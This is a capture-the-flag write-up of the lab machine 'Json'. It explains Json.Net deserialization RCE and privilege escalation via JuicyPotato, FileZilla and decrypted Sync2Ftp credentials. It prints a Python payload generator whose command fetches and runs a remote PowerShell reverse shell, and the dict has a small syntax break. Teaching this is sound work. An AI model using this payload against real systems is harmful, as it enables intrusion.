<h2 id="background">Background</h2>

<p>Json centers on trust in serialized input, configuration data, and application tokens. The assessment follows those trust boundaries to find where the implementation accepts too much control from the client.</p>
<p><strong>The Json box teaches three critical lessons:</strong></p>
<ol>
<li><strong>Do not trust serialized data from the user.</strong> If an application deserializes attacker-controlled input, it is often enough for code execution.</li>
<li><strong>Error messages are gold.</strong> A single verbose error can reveal the entire technology stack and vulnerability class.</li>
<li><strong>Privileges matter.</strong> Even a "lowly" service account with <code>SeImpersonatePrivilege</code> is one exploit away from SYSTEM.</li>
</ol>

<p><strong>Analysis:</strong> The server tried to base64-decode our input and failed. This tells us the processing pipeline is:</p>

<li>Read Bearer header</li>
<li>Base64-decode</li>
<li>Do something with the result</li>

<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">curl -i -X GET -H "Bearer: dGVzdGluZw==" -H "Cookie: OAuth2=..." http://10.129.227.191/api/Account/

<h3 id="what-the-error-reveals">What the error reveals</h3>
<p><strong>"Cannot deserialize Json.Net Object"</strong> tells us three critical things:</p>
<ol>
<li>The server is using <strong>Json.Net</strong> (Newtonsoft.Json), the most popular .NET JSON library.</li>
<li>The server is <strong>deserializing</strong> our input into a .NET object.</li>
<li>Because we control the input, we control what gets deserialized.</li>
</ol>



<p>Deserialization is the process of turning data (JSON, XML, binary) back into an object in memory. If the attacker controls this data, they can often craft it to instantiate <em>arbitrary</em> classes, leading to Remote Code Execution (RCE). This is one of the most dangerous vulnerability classes in modern web applications.</p>
<hr>
<h2 id="step-5-understanding-net-deserialization">Step 5: Understanding .NET Deserialization</h2>
<h3 id="what-is-deserialization">What is Deserialization?</h3>
<p>When a program receives JSON like <code>{"Name":"Admin"}</code>, it uses a deserializer to create an object in memory:</p>
<pre tabindex="0" aria-label="csharp code or terminal block 12"><code class="language-csharp" data-language="csharp">User user = JsonConvert.DeserializeObject&lt;User&gt;(json);
</code></pre>
<h3 id="the-danger-type-handling">The Danger: Type Handling</h3>
<p>Json.Net supports a feature called <strong>Type Name Handling</strong>. If enabled, the JSON can specify <em>which .NET class to instantiate</em>:</p>
<pre tabindex="0" aria-label="json code or terminal block 13"><code class="language-json" data-language="json">{"$type":"System.Diagnostics.Process, System"}
</code></pre>
<p>If the application deserializes this without proper restrictions, it will create a <code>Process</code> object. And certain classes, when instantiated or when their properties are set, execute code as a side effect.</p>
<h3 id="gadget-chains">Gadget Chains</h3>
<p>A <strong>gadget chain</strong> is a sequence of innocent-looking .NET classes that, when instantiated in a specific order, lead to arbitrary code execution. We don't exploit a vulnerability in .NET itself - we abuse legitimate functionality.</p>
<p><strong>Example chain:</strong></p>
<ol>
<li><code>ObjectDataProvider</code> : a WPF class that calls a method when its <code>MethodName</code> property is set.</li>
<li><code>Process</code> : when <code>Start()</code> is called, it launches a new process.</li>
<li>Combine them: <code>ObjectDataProvider.MethodName = "Start"</code>, <code>ObjectDataProvider.ObjectInstance = new Process()</code>, and <code>MethodParameters = ["cmd", "/c whoami"]</code>.</li>
</ol>
<h3 id="ysoserial-net">Ysoserial.net</h3>
<p>Manually constructing gadget chains is complex. <strong>ysoserial.net</strong> is a tool (like its Java cousin ysoserial) that automates this. It supports many gadgets and formatters:</p>
<ul>
<li><strong>Gadgets:</strong> WindowsIdentity, ObjectDataProvider, ClaimsIdentity, etc.</li>
<li><strong>Formatters:</strong> BinaryFormatter, Json.Net, SoapFormatter, etc.</li>
</ul>

<h2 id="step-6-generating-the-exploit-payload">Step 6: Generating the Exploit Payload</h2>
<h3 id="the-challenge">The Challenge</h3>
<p>We tried to run ysoserial.net on Kali with <code>mono</code>, but the <code>WindowsIdentity</code> gadget failed because our Linux host lacks Windows-specific assemblies (<code>PresentationCore</code>).</p>
<p><strong>This is a key lesson:</strong> ysoserial.net <em>generates</em> payloads. The generation itself sometimes requires the same assemblies that exist on the <em>target</em>. Our Kali machine is not Windows, so some gadgets won't generate.</p>
<h3 id="the-solution-manual-payload-construction">The Solution: Manual Payload Construction</h3>
<p>Since <code>ObjectDataProvider</code> is just JSON, we can construct it manually with Python. The target is Windows and has <code>PresentationFramework</code> in the GAC - it will deserialize our payload just fine.</p>
<h3 id="the-payload-generator">The Payload Generator</h3>
<pre tabindex="0" aria-label="python code or terminal block 14"><code class="language-python" data-language="python">import json
import base64

payload = {
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd","/c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.84:8080/rev.ps1')"]

    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
}

json_payload = json.dumps(payload, separators=(',', ':'))
b64_payload = base64.b64encode(json_payload.encode()).decode()
print(b64_payload)
</code></pre>

<ol>
<li><code>$type</code> tells Json.Net to instantiate <code>ObjectDataProvider</code>.</li>
<li><code>MethodName = "Start"</code> tells it to call the <code>Start()</code> method.</li>
<li><code>ObjectInstance</code> is a <code>Process</code> object.</li>
<li><code>MethodParameters</code> passes <code>["cmd", "/c powershell ..."]</code> to <code>Process.Start()</code>.</li>
<li><code>Process.Start("cmd", "/c powershell ...")</code> executes our command.</li>
</ol>

<h3 id="why-seimpersonateprivilege-matters">Why <code>SeImpersonatePrivilege</code> Matters</h3>
<p>This privilege allows a process to impersonate another user's security context after authenticating them. In web server contexts, this is normal - IIS needs to impersonate users to access resources.</p>
<p><strong>But:</strong> On Windows, certain COM/DCOM interactions allow you to impersonate the <code>NT AUTHORITY\SYSTEM</code> account. Tools like <strong>JuicyPotato</strong>, <strong>RoguePotato</strong>, and <strong>SweetPotato</strong> abuse this by triggering a privileged COM service to authenticate back to a rogue listener under our control. We then use the impersonation token to spawn a new process as SYSTEM.</p>

<h2 id="step-9-privilege-escalation-theory">Step 9: Privilege Escalation Theory</h2>
<h3 id="juicypotato-explained">JuicyPotato Explained</h3>
<p>JuicyPotato exploits the following Windows behavior:</p>
<ol>
<li><strong>COM/DCOM</strong> is Microsoft's component object model. Many Windows services expose COM interfaces.</li>
<li>Some COM objects, when instantiated, perform <strong>NTLM authentication</strong> to localhost.</li>
<li>The <code>NTLM</code> authentication happens over a local RPC connection.</li>
<li>JuicyPotato creates a rogue COM server on a port we control.</li>
<li>It forces a privileged COM object (running as SYSTEM) to connect to our rogue server.</li>
<li>During this connection, Windows performs the NTLM handshake.</li>
<li>Because we have <code>SeImpersonatePrivilege</code>, we can <strong>steal the SYSTEM token</strong> from this connection.</li>
<li>We then use <code>CreateProcessWithTokenW</code> to spawn a new process (our reverse shell) with that SYSTEM token.</li>
</ol>
<h3 id="clsids">CLSIDs</h3>
<p>A <strong>CLSID</strong> is a globally unique identifier for a COM class. Different Windows versions have different CLSIDs that work. For <strong>Windows Server 2012 R2</strong>, the working CLSID is:</p>
<pre tabindex="0" aria-label="Code or terminal block 21"><code>{e60687f7-01a1-40aa-86ac-db1cbf673334}
</code></pre>
<p>JuicyPotato includes a list of tested CLSIDs per OS version. If one doesn't work, you try another.</p>

<h2 id="alternative-root-paths-for-your-notes">Alternative Root Paths (For Your Notes)</h2>
<p>This box has <strong>three known privilege escalation paths</strong> from <code>userpool</code> to root access:</p>
<h3 id="path-a-filezilla-admin-interface">Path A: FileZilla Admin Interface</h3>
<ol>
<li><code>netstat -ano</code> reveals <code>127.0.0.1:14147</code> (FileZilla Server admin port).</li>
<li>Tunnel it to your machine with <strong>Chisel</strong> or SSH port forwarding.</li>
<li>Connect with the FileZilla Server interface.</li>
<li>The config file at <code>C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml</code> shows a user <code>superadmin</code>.</li>
<li>Change the password, connect via FTP on port 21, and access <code>C:\Users\superadmin\Desktop\root.txt</code>.</li>
</ol>
<h3 id="path-b-sync2ftp-custom-application">Path B: Sync2Ftp Custom Application</h3>
<ol>
<li>In <code>C:\Program Files\Sync2Ftp\</code>, find <code>SyncLocation.exe</code> and <code>SyncLocation.exe.config</code>.</li>
<li>The config contains encrypted credentials:<pre tabindex="0" aria-label="xml code or terminal block 28"><code class="language-xml" data-language="xml">&lt;add key="user" value="4as8gqENn26uTs9srvQLyg=="/&gt;
&lt;add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="/&gt;
&lt;add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/&gt;
</code></pre>
</li>
<li>Reverse-engineer the binary (dnSpy) to find it uses <strong>Triple DES (ECB mode)</strong> with an MD5-hashed key.</li>
<li>Decrypt the credentials: <code>superadmin</code> / <code>funnyhtb</code>.</li>
<li>Log in via FTP as <code>superadmin</code> and read the flag.</li>
</ol>
<h3 id="path-c-juicypotato-what-we-used">Path C: JuicyPotato (What We Used)</h3>
<p>Fastest and most direct. Abuse <code>SeImpersonatePrivilege</code> to get a SYSTEM shell.</p>
<hr>
<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="technical">Technical</h3>
<ol>
<li><strong>Json.Net deserialization</strong> with <code>TypeNameHandling</code> enabled is critical RCE territory. Check for <code>$type</code> fields in JSON APIs.</li>
<li><strong>Verbose errors</strong> (<code>Cannot deserialize Json.Net Object</code>) can reveal the exact library and vulnerability class.</li>
<li><strong>SeImpersonatePrivilege</strong> on Windows &lt; Server 2019 is often exploitable via Potato-family tools.</li>
<li><strong>Manual payload construction</strong> is possible when tools fail - understanding the underlying JSON structure is powerful.</li>
</ol>
<h3 id="methodological">Methodological</h3>
<ol>
<li><strong>Start simple.</strong> <code>admin/admin</code> worked. Don't overcomplicate before trying the obvious.</li>
<li><strong>Read errors carefully.</strong> They are often more valuable than successful responses.</li>
<li><strong>Infrastructure first.</strong> before running the exploit, ensure your listener, HTTP server, and routing are ready.</li>
<li><strong>Keep notes.</strong> Every port, every error, every file path is a piece of the puzzle.</li>
</ol>


<p>We couldn't use ysoserial.net's <code>WindowsIdentity</code> gadget because our Linux host lacked Windows assemblies. Instead of giving up, we manually constructed the <code>ObjectDataProvider</code> JSON payload. The tool was a convenience, not a requirement. <strong>Understand the vulnerability, not just the tool.</strong></p>
